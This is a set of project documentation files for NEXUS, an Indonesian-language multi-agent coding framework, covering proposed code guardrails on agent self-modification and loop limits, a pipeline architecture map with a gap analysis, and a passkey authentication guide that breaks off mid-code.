NEXUS adalah **Modular Semantic Multi-Agent Framework**. Bukan AGI. Bukan self-aware system. Target akhir adalah **reliable, stable, observable multi-agent orchestration**.

---

### 🔒 3 Pagar Utama Yang Wajib Ada

---

#### PAGAR 1 — Batasi LocalIntelligence

`LocalIntelligence.js` adalah komponen paling berisiko karena memberikan kemampuan reasoning bebas ke sistem. Harus dibatasi dengan scope contract.

**Implementasi Pagar:**

```javascript
// agent/core/LocalIntelligence.js — TAMBAHKAN ini

// Whitelist: satu-satunya task yang boleh dilakukan LocalIntelligence
const ALLOWED_TASKS = [
    'review_code_quality',
    'suggest_refactor',
    'explain_error',
    'validate_migration_schema'
];

async generate(prompt, taskType, systemPrompt) {
    // 1. WAJIB: Validate task type
    if (!ALLOWED_TASKS.includes(taskType)) {
        throw new Error(
            `LocalIntelligence Boundary Violation: ` +
            `Task "${taskType}" tidak ada dalam whitelist. ` +
            `Allowed: [${ALLOWED_TASKS.join(', ')}]`
        );
    }

    // 2. WAJIB: Hard token limit — tidak boleh diubah
    const MAX_TOKENS = 512;

    // 3. WAJIB: System prompt dikunci — tidak boleh di-override dari luar
    const LOCKED_SYSTEM_PROMPT =
        `You are a TALL Stack code reviewer. ` +
        `Your role is LIMITED to: ${ALLOWED_TASKS.join(', ')}. ` +
        `You MUST NOT generate code autonomously, make architectural decisions, ` +
        `or perform any action outside your defined role. ` +
        `Respond in structured format only.`;

    if (!this.isAvailable) await this.checkAvailability();
    if (!this.isAvailable) return null;

    const response = await axios.post(`${this.baseUrl}/generate`, {
        model: this.model,
        prompt: prompt,
        system: LOCKED_SYSTEM_PROMPT, // system prompt TIDAK bisa di-override
        stream: false,
        options: { temperature: 0.1, num_ctx: MAX_TOKENS } // temperature rendah = lebih deterministik
    });

    // 4. WAJIB: Validate output schema sebelum dikembalikan
    return this.validateOutput(response.data.response, taskType);
}

validateOutput(output, taskType) {
    // Output harus ada dan dalam bentuk string
    if (!output || typeof output !== 'string') return null;

    // Output tidak boleh terlalu panjang (anti-hallucination runaway)
    if (output.length > 2000) {
        console.warn(`⚠️ LocalIntelligence: Output terlalu panjang (${output.length} chars). Truncated.`);
        return output.substring(0, 2000) + '\n...[TRUNCATED BY BOUNDARY GUARD]';
    }

    return output;
}
```

---

#### PAGAR 2 — Batasi EvolutionPiper (Anti-Infinite Loop)

`[RECURSIVE_EVOLUTION_ARCHITECT.md](../other/NEXUS_RECURSIVE_EVOLUTION_ARCHITECT.MD)` mendeskripsikan "infinite loop" yang bisa jalan tanpa batas. Ini harus diberi batas eksplisit.

**Implementasi Pagar:**

```javascript
// agent/core/EvolutionPiper.js — TAMBAHKAN di constructor

constructor(rootPath) {
    this.rootPath = rootPath;

    // ⛔ HARD LIMIT: Maksimal iterasi per session
    // Ini TIDAK BOLEH diubah secara programatik
    this.MAX_EVOLUTION_CYCLES = 25; // Satu phase = max 25 project
    this.currentCycle = 0;

    // ⛔ HARD LIMIT: Maksimal waktu eksekusi total
    this.MAX_SESSION_MINUTES = 120; // 2 jam
    this.sessionStartTime = null;
}

// TAMBAHKAN method guard ini — dipanggil di awal setiap evolve()
async checkEvolutionBoundary() {
    // Cek cycle limit
    if (this.currentCycle >= this.MAX_EVOLUTION_CYCLES) {
        throw new Error(
            `🚧 EVOLUTION BOUNDARY: Reached maximum cycles (${this.MAX_EVOLUTION_CYCLES}). ` +
            `Manual review required before next phase. ` +
            `Run 'nexus distill' then reset cycle counter manually.`
        );
    }

    // Cek time limit
    if (this.sessionStartTime) {
        const elapsed = (Date.now() - this.sessionStartTime) / 60000;
        if (elapsed > this.MAX_SESSION_MINUTES) {
            throw new Error(
                `🚧 EVOLUTION BOUNDARY: Session exceeded ${this.MAX_SESSION_MINUTES} minutes. ` +
                `Session paused for resource safety.`
            );
        }
    }

    this.currentCycle++;
    console.log(`🔄 Evolution Cycle: ${this.currentCycle}/${this.MAX_EVOLUTION_CYCLES}`);
}

// TAMBAHKAN di awal method evolve() atau spawnSandbox():
async spawnSandbox(projectName, tags) {
    await this.checkEvolutionBoundary(); // ← WAJIB dipanggil pertama
    // ... rest of logic
}
```

---

#### PAGAR 3 — Batasi Machinist (Anti-Self-Modification)

`Machinist.forge()` bisa generate file `.js` baru dan inject ke sistem. Ini harus dibatasi hanya ke folder yang aman.

**Implementasi Pagar:**

```javascript
// agent/core/Machinist.js — TAMBAHKAN ini

// Whitelist folder yang boleh di-write oleh Machinist
// TIDAK BOLEH ada path di luar ini
const FORGE_ALLOWED_PATHS = [
    'agent/tools/scanners/',  // ✅ Scanner plugins — aman
];

// Blacklist absolut — TIDAK PERNAH boleh disentuh Machinist
const FORGE_FORBIDDEN_PATHS = [
    'agent/core/',            // ❌ Core engine
    'agent/main.js',          // ❌ Entry point
    'cli.js',                 // ❌ CLI
    'agent/prompts/',         // ❌ Agent prompts (bisa manipulasi behavior)
    'memory/distilled/',      // ❌ Knowledge HUB (hanya boleh lewat Distiller)
];

async forge(name, wisdomPath) {
    // 1. Validate output path
    const outputPath = `agent/tools/scanners/${name.toLowerCase()}-scanner.js`;

    const isAllowed = FORGE_ALLOWED_PATHS.some(p => outputPath.startsWith(p));
    const isForbidden = FORGE_FORBIDDEN_PATHS.some(p => outputPath.startsWith(p));

    if (!isAllowed || isForbidden) {
        throw new Error(
            `🚧 MACHINIST BOUNDARY VIOLATION: ` +
            `Attempted to forge into forbidden path: "${outputPath}". ` +
            `Forge is restricted to: [${FORGE_ALLOWED_PATHS.join(', ')}]`
        );
    }

    // 2. Validate wisdom source — harus dari HUB, bukan file arbitrary
    const absoluteWisdom = path.resolve(wisdomPath);
    const absoluteHub = path.resolve('memory/distilled/');

    if (!absoluteWisdom.startsWith(absoluteHub)) {
        throw new Error(
            `🚧 MACHINIST BOUNDARY VIOLATION: ` +
            `Wisdom source must be from memory/distilled/. ` +
            `Got: "${wisdomPath}"`
        );
    }

    // 3. Generated code tidak boleh require() module core
    // (dicek setelah generate, sebelum write)
    const generatedCode = await this.generateScannerCode(name, wisdomPath);
    const forbiddenImports = ['NexusEngine', 'MemoryPipeline', 'Orchestrator', 'EvolutionPiper'];

    for (const forbidden of forbiddenImports) {
        if (generatedCode.includes(forbidden)) {
            throw new Error(
                `🚧 MACHINIST BOUNDARY VIOLATION: ` +
                `Generated scanner tried to import core module: "${forbidden}". ` +
                `Scanners must be isolated.`
            );
        }
    }

    // Lanjut ke forge setelah semua validasi lulus
    // ... rest of logic
}
```

---

### 📋 Checklist Guardrail — Status Current

| Guardrail                             | Status          | Action                             |
| :------------------------------------ | :-------------- | :--------------------------------- |
| `LocalIntelligence` task whitelist    | ❌ Belum ada    | Implementasi Pagar 1               |
| `LocalIntelligence` output validation | ❌ Belum ada    | Implementasi Pagar 1               |
| `EvolutionPiper` cycle limit          | ❌ Belum ada    | Implementasi Pagar 2               |
| `EvolutionPiper` session time limit   | ❌ Belum ada    | Implementasi Pagar 2               |
| `Machinist` path whitelist            | ❌ Belum ada    | Implementasi Pagar 3               |
| `Machinist` forbidden imports check   | ❌ Belum ada    | Implementasi Pagar 3               |
| `WorktreeManager` active flag         | ❌ Misleading   | Tambahkan `isActive = false` guard |
| `[alur agi.md](../other/NEXUS_ALUR AGI.MD)` — diagram direvisi      | ⚠️ Perlu revisi | Lihat Bagian 4                     |

---

## BAGIAN 4 — REVISI DIAGRAM AGI

Diagram `[alur agi.md](../other/NEXUS_ALUR AGI.MD)` saat ini:

```
LLM → Agent → AGI
```

**Harus diganti menjadi:**

```
LLM → Tool Agent → Workflow Agent → Multi-Agent Framework → ⛔ BOUNDARY
                                          ↑
                                      [NEXUS v3.x]
```

Dan file `documentation/mermaid/[alur agi.md](../other/NEXUS_ALUR AGI.MD)` sebaiknya direname menjadi `alur nexus boundary.md` dengan konten:

```mermaid
graph LR
    A["LLM\n(Text Generation)"]
    B["Tool Agent\n(LLM + Tools)"]
    C["Workflow Agent\n(Planned Execution)"]
    D["Multi-Agent Framework\n(Orchestrated Collaboration)"]
    E["⛔ NEXUS BOUNDARY"]
    F["Autonomous Runtime\n(Self-Directed Goals)"]
    G["AGI\n(General Intelligence)"]

    A --> B --> C --> D --> E
    E -. OUT OF SCOPE .-> F
    F -. OUT OF SCOPE .-> G

    style D fill:#2d6a4f,color:#fff
    style E fill:#d62828,color:#fff
    style F fill:#555,color:#aaa
    style G fill:#555,color:#aaa
```

---

## BAGIAN 5 — SARAN PRIORITAS

### 🔴 Lakukan Sekarang

1. **Implementasi 3 Pagar** di atas — bisa dikerjakan dalam 1 sesi
2. **Fix `SemanticEngine` import** di `NexusEngine.js` — sekarang dead code
3. **Tambahkan `isActive = false` guard** di `WorktreeManager.js`

### 🟡 Sprint Berikutnya

4. **Revisi `[alur agi.md](../other/NEXUS_ALUR AGI.MD)`** menjadi boundary diagram
5. **Tambahkan `nexus status` command** yang menampilkan:
   - Current evolution cycle count
   - Session time elapsed
   - Guardrail status (active/inactive)
6. **Aktifkan `WorktreeManager`** dengan uncomment git commands + testing

### 🟢 Enhancement

7. **Buat `NEXUS_GUARDRAIL_LOG.md`** yang otomatis di-append setiap kali guardrail terpicu — audit trail yang penting
8. **Tambahkan unit test untuk setiap pagar** — `TDDGuard` harus reject kode yang bypass guardrail

---

## KESIMPULAN

NEXUS saat ini ada di posisi yang **tepat sebagai Multi-Agent Framework**. Arsitekturnya sudah solid, boundary docs sudah ada. Yang kurang adalah **enforcement di level kode** — boundary-nya baru ada di dokumentasi, belum di `throw new Error()`.

Tiga pagar di dokumen ini mengubah boundary dari dokumentasi menjadi **kode yang enforce dirinya sendiri**.

> Sistem yang aman bukan sistem yang punya dokumen larangan.  
> Sistem yang aman adalah sistem yang **secara teknis tidak bisa** melanggar batasnya sendiri.

---

> **METADATA (NEXUS SEMANTIC TAGS)**: [security, architecture, tdd, standards, guardrail, multi-agent]  
> **Status**: READY_FOR_IMPLEMENTATION  
> _Senior AI Engineer Review | NEXUS v3.2.0_

### 📘 KNOWLEDGE: NEXUS_NEXUS_PIPELINE_MAP.MD

# 🧠 NEXUS AI — Pipeline Architecture Map
> **VERSION**: v1 | **Last Updated**: 26/05/2026


> **Scan Date**: 2026-05-11 | **Engine**: Antigravity AI Engineer  
> **Version**: Human-AI Nexus v3.1.0 | **Mode**: Extreme Scan

---

## 1. 📦 Struktur Makro Project

```
NEXUS AI/
├── cli.js                      ← Entry Point (Global CLI: `nexus <cmd>`)
├── agent/
│   ├── main.js                 ← Command Router (run/audit/harvest/distill/forge)
│   ├── core/                   ← OTAK UTAMA ENGINE
│   ├── prompts/                ← Agent Prompt Bank (internal + external)
│   ├── tools/                  ← Specialized Tools & Scanners
│   ├── workflows/              ← Skill Workflow Definitions
│   └── scripts/                ← Automated Loop Scripts
├── memory/
│   ├── raw/                    ← Audit mentah masuk di sini
│   ├── normalized/             ← Data setelah sanitasi
│   ├── semantic/               ← Indexed data berdasarkan tag
│   ├── distilled/              ← KNOWLEDGE HUB (master wisdom)
│   ├── operational/            ← Records, sessions, link cache
│   ├── archived/               ← Backup & rotasi file
│   └── short_term/             ← Cache sementara (link_cache.json)
├── knowledge/                  ← Session archives TDD & test logs
├── golden/harvest/             ← Zona staging harvest dari project external
├── documentation/              ← Output laporan (audit, planning, summary)
├── logs/                       ← Observability (agents/orchestration/errors)
├── tests/
│   ├── TDD/                    ← Test runner
│   └── sandboxes/              ← Lab environment (EvolutionPiper)
└── config/.env.example         ← Konfigurasi dasar
```

---

## 2. 🔄 PIPELINE UTAMA: Full Cycle

```mermaid
flowchart TD
    A["👤 USER / CLI\n`nexus run`"] --> B["cli.js\n(Entry Point)"]
    B --> C["agent/main.js\n(Command Router)"]

    C --> D["NexusEngine\n(Core Orchestrator)"]

    subgraph INIT["🔷 FASE INIT"]
        D --> D1["discoverSkills()\nScan workflows/internal & external"]
        D --> D2["readMemory()\nLoad distilled/ + semantic index"]
        D --> D3["ResourceMonitor.checkStress()\nThrottle jika RAM kritis"]
    end

    INIT --> P1

    subgraph P1["⚡ FASE 1: AUDIT"]
        P1A["Structural Scan\n(folder existence check)"]
        P1B["Specialist Agents x6\n(Parallel Promise.all)"]
        P1C["SandboxExecutor\n(jalankan scanner .js sandboxed)"]
        P1D["Hardcoded Machine Audit\n(SchemaGuard, QueryOptimizer, A11yScanner)"]
        P1E["Dynamic Forged Scanners\n(tools/scanners/*.js)"]
        P1F["AuditReport object\n+ .json + .md ke memory/raw"]
        P1A --> P1B --> P1C --> P1D --> P1E --> P1F
    end

    P1 --> P2

    subgraph P2["📋 FASE 2: PLANNING"]
        P2A["engine.plan(auditReport)"]
        P2B["Map findings → Task objects\n+ AUTO-ACTION generation"]
        P2C["ImplementationPlan object\n+ .json + .md ke documentation/planning"]
        P2D["👤 DEV APPROVAL GATE\n(interactive y/n loop)"]
        P2A --> P2B --> P2C --> P2D
    end

    P2 --> P3

    subgraph P3["🚀 FASE 3: EXECUTION"]
        P3A["engine.execute(plan)"]
        P3B["TDDGuard.validate()\nBlokir jika test belum ada"]
        P3C["TDDScaffolder.generate()\nAuto-buat test jika diblokir"]
        P3D["Modifier.apply()\nFILE_REPLACE / FILE_APPEND / RESOLVE_OPTIONS"]
        P3E["AssetEngine.process()\nAsset optimization"]
        P3F["Self-Healing Doc Update\nupdateRecapStatus()"]
        P3A --> P3B --> P3C --> P3D --> P3E --> P3F
    end

    P3 --> P4

    subgraph P4["🔍 FASE 4: VERIFICATION"]
        P4A["engine.verify(plan)"]
        P4B["Validator.verifyAction()\nCek apakah aksi benar-benar berdampak"]
        P4C["Task marked: done / failed_verification"]
        P4A --> P4B --> P4C
    end

    P4 --> P5

    subgraph P5["📝 FASE 5: RECORDING & MEMORY"]
        P5A["engine.record(cycleID)"]
        P5B["session_TIMESTAMP.json\n→ memory/operational/records"]
        P5C["MemoryPipeline.optimize()"]
        P5D["archiveAuditReports()\narchiveImplementationPlans()"]
        P5E["processHarvestData()\ngolden/harvest → memory/distilled"]
        P5F["generateCycleSummary()\n→ documentation/summary"]
        P5A --> P5B --> P5C --> P5D --> P5E --> P5F
    end

    P5 --> END["✅ SIKLUS SELESAI\nSTATE: COMPLETED"]
```

---

## 3. 🧬 PIPELINE DISTILLATION (Perintah: `nexus distill`)

```mermaid
flowchart LR
    DI["engine.distill()"] --> DA["Distiller.run()"]

    subgraph DISTILL["Distillation Pipeline (7 Steps)"]
        direction TB
        S1["1. distillAcademics()\nExtract insights dari file academic\n→ memory/distilled/academics/NEXUS_DISTILLATION_*.md"]
        S2["2. standardizeNames()\nRename semua file → NEXUS_ prefix"]
        S3["3. applySemanticTagging()\nInject METADATA TAGS ke setiap file"]
        S4["4. shelve()\nPindahkan file ke rack semantic:\nsecurity/ performance/ ui-ux/ database/ tdd/ vcs/"]
        S5["5. applySemanticLinking()\nCross-link antar file (path-aware)\n+ link_cache.json untuk efisiensi"]
        S6["6. generateHubIndex()\nBuat NEXUS_HUB_INDEX.md\n+ NEXUS_SEMANTIC_INDEX.json"]
        S7["7. generateNeuralMap()\nBuat NEXUS_NEURAL_MAP.md\n(Mermaid graph TD dari semua koneksi)"]
        S1 --> S2 --> S3 --> S4 --> S5 --> S6 --> S7
    end

    DA --> DISTILL
```

---

## 4. 🌾 PIPELINE HARVESTING (Perintah: `nexus harvest <path>`)

```mermaid
flowchart TD
    H1["nexus harvest /path/to/project"] --> H2["engine.harvest(sourcePath)"]
    H2 --> H3["Deteksi: nexus/ atau documentation/ di source"]
    H3 --> H4["Copy audit/ planning/ summary/ records/\n→ golden/harvest/ProjectName/"]
    H4 --> H5["MemoryPipeline.processHarvestData()"]
    H5 --> H6["cleanseContent()\nRedact: API keys, credentials, IPs"]
    H6 --> H7{"isRecords?"}
    H7 -->|Ya| H8["→ memory/operational/records/"]
    H7 -->|Tidak| H9["→ memory/distilled/ (Knowledge HUB)"]
    H8 --> H10["emptyDir(golden/harvest)\nRecycle zona staging"]
    H9 --> H10
```

---

## 5. 🔥 PIPELINE FORGE (Perintah: `nexus forge <Name> <wisdom.md>`)

```mermaid
flowchart TD
    F1["nexus forge BrandingScanner\n  memory/distilled/NEXUS_BRANDING.md"] --> F2["Machinist.forge(name, wisdomPath)"]
    F2 --> F3["Baca wisdom file\nExtract 'Actionable Steps' / 'Core Insights'"]
    F3 --> F4["getScannerTemplate()\nGenerate .js scanner dari rules"]
    F4 --> F5["Tulis ke agent/tools/scanners/branding-scanner.js"]
    F5 --> F6["TDDScaffolder.generate()\nAuto-scaffold test untuk scanner baru"]
    F6 --> F7["Scanner siap dipakai di Audit Cycle berikutnya\n(Dynamic Forged Scanners)"]
```

---

## 6. 🧠 LAYER MEMORI — Hierarki & Alur Data

```
INPUT DATA
    │
    ▼
memory/raw/                  ← Audit reports mentah (report_agentid_AUDITID.json/md)
    │
    ▼ [MemoryPipeline.archiveAuditReports()]
memory/operational/          ← Session records, archive index
    │
    ▼ [Harvest → cleanseContent()]
memory/distilled/            ← KNOWLEDGE HUB (sumber kebenaran)
    │
    ├── standards/           ← Prinsip, protokol, kontrak
    ├── security/            ← Wisdom keamanan
    ├── performance/         ← Wisdom performa
    ├── ui-ux/              ← Wisdom desain
    ├── database/            ← Wisdom database
    ├── tdd/                 ← Wisdom pengujian
    ├── vcs/                 ← Wisdom version control
    └── academics/           ← Hasil distilasi paper/artikel
    │
    ▼ [Distiller.generateHubIndex()]
memory/distilled/NEXUS_HUB_INDEX.md       ← Master index
memory/distilled/NEXUS_SEMANTIC_INDEX.json ← Semantic search index
memory/distilled/NEXUS_NEURAL_MAP.md       ← Mermaid connection graph
    │
    ▼ [NexusEngine.readMemory() → searchKnowledge(tag)]
SEMANTIC SEARCH             ← Engine query HUB berdasarkan tag
memory/short_term/link_cache.json ← Cache linking untuk efisiensi
```

---

## 7. 👥 AGENT REGISTRY — 14 Specialist Prompts

| # | Agent ID | Domain | Type |
|---|----------|--------|------|
| 1 | `orchestrator` | Master orchestration | Internal (~2MB prompt) |
| 2 | `guru` | Senior wisdom | Internal (~2MB prompt) |
| 3 | `pipeline-architect` | Pipeline design | Internal (~2MB prompt) |
| 4 | `agent-manager` | Agent coordination | Internal |
| 5 | `golden-crawler` | Knowledge harvesting | Internal |
| 6 | `looping-tester` | TDD loop automation | Internal |
| 7 | `machinist` | Machine forging | Internal |
| 8 | `memory-manager` | Memory optimization | Internal |
| 9 | `cyber-security` | Security auditing | Internal + Scanner |
| 10 | `ux-engineer` | UX/Design auditing | Internal + Scanner |
| 11 | `seo-performance-specialist` | SEO & performance | Internal + Scanner |
| 12 | `database-architect` | Schema & queries | Internal + Scanner |
| 13 | `vcs-architect` | Git health | Internal + Scanner |
| 14 | `documentation-architect` | Docs compliance | Internal + Scanner |

---

## 8. ⚙️ CORE MODULES — Dependency Map

```mermaid
graph TD
    NE["NexusEngine (God Object)"]
    
    NE --> MOD["Modifier\n(File mutations)"]
    NE --> MEM["MemoryPipeline\n(Archive & harvest data)"]
    NE --> MEMG["MemoryGovernor\n(Locking & validation)"]
    NE --> DIST["Distiller\n(Knowledge HUB ops)"]
    NE --> MACH["Machinist\n(Forge new scanners)"]
    NE --> ORCH["Orchestrator\n(EventBus task routing)"]
    NE --> EVOL["EvolutionPiper\n(Lab sandbox lifecycle)"]
    NE --> SBX["SandboxExecutor\n(Isolated scanner exec)"]
    NE --> LOG["Logger\n(Structured observability)"]
    NE --> CLK["NexusClock\n(Timestamp utils)"]
    NE --> RSM["ResourceMonitor\n(RAM/CPU stress check)"]
    NE --> EB["EventBus (singleton)\n(Pub/Sub event system)"]
    NE --> DC["DecisionEngine\n(Weighted scoring resolver)"]
    
    NE --> T1["TDDGuard\n(Test gate)"]
    NE --> T2["TDDScaffolder\n(Auto-generate tests)"]
    NE --> T3["BugHunter"]
    NE --> T4["Validator\n(Post-exec verification)"]
    NE --> T5["SchemaGuard\n(DB model scanner)"]
    NE --> T6["QueryOptimizer\n(Migration scanner)"]
    NE --> T7["AccessibilityScanner"]
    NE --> T8["AssetEngine"]
    NE --> T9["Designer"]
    NE --> T10["RootCauseAnalyzer"]

    ORCH --> EB
    ORCH --> SBX
```

---

## 9. 🔁 EVOLUSI SKILL — Update Skills Pipeline

```mermaid
flowchart LR
    US1["nexus update-skills"] --> US2["engine.massUpdateSkills()"]
    US2 --> US3["Scan memory/distilled/\n(semua file .md wisdom)"]
    US3 --> US4["Untuk setiap agent di prompts/internal/\nInject distilled wisdom ke prompt"]
    US4 --> US5["Skill terupdate → Agent lebih pintar di cycle berikutnya"]
```

---

## 10. 🔄 REFACTOR PIPELINE (Golden → HUB)

```mermaid
flowchart LR
    R1["nexus refactor"] --> R2["engine.massRefactor()"]
    R2 --> R3["Scan golden/ untuk template terbaik"]
    R3 --> R4["Bandingkan dengan memory/distilled/\ngunakan DecisionEngine scoring"]
    R4 --> R5["Merge atau replace wisdom"]
    R5 --> R6["Update NEXUS_HUB_INDEX.md"]
```

---

## 11. 🚨 SISTEM STATE & ERROR HANDLING

```
INIT → PROCESSING → EXECUTING → LOGGING → COMPLETED
                                              ↓
                                           FAILED (jika throw NexusError)
                                              ↓
                                        logError() → documentation/summary/error_log.json
```

**Retry Logic** (Orchestrator):
- MAX_RETRY = 3 attempts per task
- EventBus: `SCANNER_TRIGGERED` → `SCANNER_FINISHED` / `TASK_FAILED`

**MemoryGovernor Lock System**:
- Setiap operasi tulis ke memory pakai file lock (`.lock`)
- Timeout 5000ms → throw jika deadlock

---

## 12. 🗂️ CLI Commands — Full Map

| Command | Handler | Pipeline |
|---------|---------|----------|
| `nexus` (default) | `install()` | Setup nexus/ di project target |
| `nexus run` | `main.js → runCycle()` | Full: Audit→Plan→Execute→Verify→Record |
| `nexus audit` | `engine.audit()` | Audit only |
| `nexus harvest <dir>` | `engine.harvest()` | Harvest dari project lain |
| `nexus distill` | `engine.distill()` | Distillation pipeline (7 steps) |
| `nexus forge <N> <f>` | `machinist.forge()` | Build scanner dari wisdom |
| `nexus refactor` | `engine.massRefactor()` | Golden → HUB sync |
| `nexus update-skills` | `engine.massUpdateSkills()` | HUB → Agent prompts update |
| `nexus skills` | `engine.discoverSkills()` | List semua skill registry |
| `nexus update` | `updateEngine()` | Sync external prompts/workflows |
| `nexus dell` | `uninstall()` | Safe remove nexus/ (preserve docs) |

---

## 13. ⚠️ GAP ANALYSIS & ISSUES TERIDENTIFIKASI

| # | Issue | File | Severity |
|---|-------|------|----------|
| 1 | `MemoryPipeline.archiveAuditReports()` & `archiveImplementationPlans()` — **auto-delete DISABLED** (hotfix comment) | MemoryPipeline.js:120 | 🟡 MEDIUM |
| 2 | `appendToArchive()` juga **di-comment** — archive tidak pernah ter-trigger | MemoryPipeline.js:129 | 🟡 MEDIUM |
| 3 | `EvolutionPiper.harvestWisdom()` path ke `memory/long_term/distilled` tapi folder ini **tidak exist** (seharusnya `memory/distilled`) | EvolutionPiper.js:64 | 🔴 BUG |
| 4 | `Machinist.integrate()` hardcode path `./../auditor/${name}` tapi folder `auditor/` **tidak exist** di project | Machinist.js:42 | 🔴 BUG |
| 5 | `DecisionEngine` terdefinisi tapi **tidak di-import** di NexusEngine.js — fungsi refactor belum terhubung | DecisionEngine.js | 🟡 MEDIUM |
| 6 | `massRefactor()` & `massUpdateSkills()` **tidak ditemukan** di NexusEngine.js (dipanggil dari main.js tapi tidak ada implementasi) | NexusEngine.js | 🔴 CRITICAL |
| 7 | `memory/semantic/` selalu **kosong** — tidak ada pipeline yang aktif mengisi folder ini | memory/semantic/ | 🟡 MEDIUM |
| 8 | `config/` hanya berisi `.env.example` — tidak ada loader konfigurasi | config/ | 🟢 LOW |
| 9 | `EvolutionPiper` di-define tapi **tidak di-import** di NexusEngine.js | EvolutionPiper.js | 🟡 MEDIUM |
| 10 | Logger structured logging ada tapi **log files di `logs/`** belum terverifikasi isinya | logs/ | 🟢 LOW |

---

## 14. 🎯 REKOMENDASI PRIORITAS

### 🔴 Critical (Segera)
1. **Implementasi `massRefactor()` & `massUpdateSkills()`** di NexusEngine.js — saat ini akan throw "not a function"
2. **Fix path `EvolutionPiper`** dari `memory/long_term/distilled` → `memory/distilled`
3. **Fix path `Machinist.integrate()`** dari `./../auditor/` → path yang valid

### 🟡 Medium (Sprint Berikutnya)
4. **Reaktifkan archiving di MemoryPipeline** — saat ini dead code, memory/raw tidak pernah dibersihkan
5. **Import & gunakan `DecisionEngine`** di refactor flow
6. **Aktifkan `memory/semantic/`** sebagai output dari semantic tagging pipeline
7. **Import `EvolutionPiper`** ke NexusEngine agar lab cycle bisa digunakan

### 🟢 Enhancement
8. Buat `config loader` dari `.env.example` → runtime config
9. Tambah `nexus status` command untuk health check semua pipeline
10. Tambah `nexus test` integrasi ke TDD runner otomatis

---

*Scan dilakukan oleh: Antigravity AI Engineer | Nexus Pipeline Architecture v3.1.0*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_PASSKEY-AUTHENTICATION.MD

# Passkey Authentication Guide
> **VERSION**: v1 | **Last Updated**: 26/05/2026



This guide details how to implement returning user authentication using discoverable credentials, both through explicit button triggers and seamless browser autofill suggestions (Conditional UI).

## Server-Side

### Options Generation

Create an endpoint that generates WebAuthn request parameters using a vetted library per standards.

1.  **Use the predefined RP ID**: Use the predefined proper RP ID as a constant string.
2.  **Generate challenge**: Generate a high-entropy, cryptographically secure random buffer, store it securely in the user's session, and encode it as Base64URL.
3.  **Discoverable Credentials mapping**: Specify an empty array `[]` for `allowCredentials`. This requests discoverable credentials, meaning the user does not need to enter their username first; the passkey provider will present available accounts.
4.  **User Verification level**: Set `userVerification: "preferred"` (or `"required"` if explicitly mandated by corporate compliance policies).
    - The requested `userVerification` constraint level MUST be persisted inside the server session record at the options endpoint, rather than passed back from the client via query strings. This allows the verification endpoint to enforce strict matching constraints safely without risk of client manipulation.

```javascript
// Options generation example (discoverable flow)
const options = {
  challenge: serverGeneratedBase64UrlChallenge, // High-entropy random challenge stored in session
  rpId: "example.com",
  allowCredentials: [], // Request discoverable passkeys
  userVerification: "preferred",
};

// Persist expected UV level to user session
req.session.expectedUserVerification = "preferred";
```

### Verification Endpoint

Securely verify the assertion returned by the client to authenticate the user:

1.  **Validate session challenge**: Enforce strict challenge matching between the client response and the expected challenge stored in the session.
2.  **Enforce UV Preferences**:
    - Allow UV-less authenticators (e.g., authenticator screen locks disabled) if the session's `expectedUserVerification` requested `"preferred"`, by passing `requireUserVerification: false` to your server-side verification library. If requested `"required"`, enforce biometrics/PIN entry strictly.
3.  **Clean Server Error 404**: If the credential ID returned by the client is not found in the database, return an explicit HTTP `404` error so the client can trigger the Signal API.

## Client-Side Logic

### HTML Form Annotation

Annotate your username and password inputs to natively leverage Conditional UI. Autocomplete tokens combine the webauthn spec parameters, and autofocus triggers the browser autofill popup immediately when the input is focused.

```html
<!-- Autocomplete tokens must contain webauthn space-separated -->
<form id="signin-form">
  <input
    type="text"
    name="username"
    autocomplete="username webauthn"
    autofocus
    data-testid="username-field"
  />
  <input type="password" name="password" autocomplete="current-password" />
  <button type="submit">Sign in</button>
</form>
```

### Explicit Button Flow

Trigger passkey authentication when a user clicks a "Sign in with passkey" button. Abort any ongoing form autofill (Conditional Get) calls before invoking the passkey prompt.

### Conditional Mediation Flow (Form Autofill)

Activate form autofill suggestions on page load to offer passkey authentication natively when users focus on sign-in fields:

1.  **Feature detect**: Call `PublicKeyCredential.getClientCapabilities()` on page load and **skip signing in with passkey** if `conditionalGet` is not available.
2.  **Decode options**: Decode fetched credential JSON object with `PublicKeyCredential.parseRequestOptionsFromJSON()`.
3.  **Invoke Conditional Get**: Call `navigator.credentials.get()` with `mediation: "conditional"` and pass an `AbortController` signal. This registers autofill silently without rendering a passkey dialog.
4.  **Try/Catch Exception Segregation**: Wrap `navigator.credentials.get` call in try/catch block:
    - `NotAllowedError`: The user cancelled or timed out the passkey login prompt.
    - `AbortError`: The authentication request was cancelled programmatically.
5.  **Call Signal API**: Wrap server verification `fetch()` call in a try/catch block:
    - Show an error message for the user to understand what went wrong.
    - Call `signalUnknownCredential()` ONLY when the server explicitly responds with HTTP status `404` (Credential not found) and the user is unauthenticated.
    - The `credentialId` parameter passed to `signalUnknownCredential()` MUST strictly be the Base64URL-encoded credential ID string (e.g., `encoded.id`), NOT the raw ArrayBuffer object `credential.rawId`.
6.  **Encode the response**: Encode the credential `AuthenticatorAssertionResponse` with `.toJSON()` before sending it to the server for verification.

```javascript
// optionsFetch and loginVerifyFetch are app-defined HTTP methods
import { optionsFetch, loginVerifyFetch } from "./api.js";

let autofillAbortController = new AbortController();

async function initializeConditionalAutofill() {
  // Feature detect Conditional Get autofill support
  const capabilities = await PublicKeyCredential.getClientCapabilities();
  if (capabilities.conditionalGet === true) {
    const loginOptionsJSON = await optionsFetch();
    const publicKey =
      PublicKeyCredential.parseRequestOptionsFromJSON(loginOptionsJSON);

    try {
      // Initiate Conditional UI form autofill suggestions
      const credential = await navigator.credentials.get({
        publicKey,
        signal: autofillAbortController.signal,
        mediation: "conditional",
      });

      // Segregated verification fetch
      const encoded = credential.toJSON();
      const response = await loginVerifyFetch(encoded);
      if (!response.ok && response.status === 404) {
        // Note: this code path runs pre-authentication, satisfying the unauth precondition
        if (PublicKeyCredential.signalUnknownCredential) {
          await PublicKeyCredential.signalUnknownCredential({
            rpId, // RP ID must match the one defined on the server
            credentialId: encoded.id,
          });
        }
      }
    } catch (err) {
      // Silently swallow expected client WebAuthn exceptions
      if (["NotAllowedError", "AbortError"].includes(err.name)) {
        return;
      }
      console.error("Unexpected conditional get error:", err);
    }
  }
}

async function triggerButtonAuthentication() {
  // Abort any pending Conditional Get call to prevent passkey prompt collisions
  autofillAbortController.abort();
  autofillAbortController = new AbortController(); // Reset controller for next triggers

